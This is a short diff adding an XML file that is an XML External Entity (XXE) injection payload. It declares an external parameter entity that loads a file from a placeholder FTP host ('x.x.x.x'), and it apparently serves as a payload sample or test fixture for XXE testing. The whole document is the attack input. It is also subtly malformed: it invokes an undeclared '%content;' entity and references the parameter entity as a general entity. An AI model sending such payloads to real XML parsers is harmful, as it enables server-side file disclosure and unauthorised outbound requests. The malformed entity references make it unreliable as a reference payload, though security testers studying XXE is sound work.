@@ -1,0 +1,8 @@
+<?xml version="1.0" ?>
+<!DOCTYPE xxeElement [
+<!ELEMENT xxeElement ANY >
+<!ENTITY % xxeEntity SYSTEM "ftp://x.x.x.x/file.txt">
+%xxeEntity;
+%content;
+]>
+<xxeElement>&xxeEntity;</xxeElement>
